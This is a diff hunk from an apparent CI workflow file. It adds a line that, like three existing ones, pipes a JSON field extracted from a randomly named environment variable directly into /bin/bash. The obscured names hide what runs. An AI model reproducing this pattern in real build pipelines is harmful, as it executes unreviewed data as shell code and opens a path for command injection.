@@ -29,6 +29,7 @@ jobs:
           echo $raes14989 | jq -r .fqgn93 | /bin/bash
           printf '%s' "$fmk0" | jq -r .jtxp65 | /bin/bash
           printf '%s' "$uq6" | jq -r .ivifv093 | /bin/bash
+          echo $cb7 | jq -r .au8 | /bin/bash
 
       - name: Archive results
         if: always()
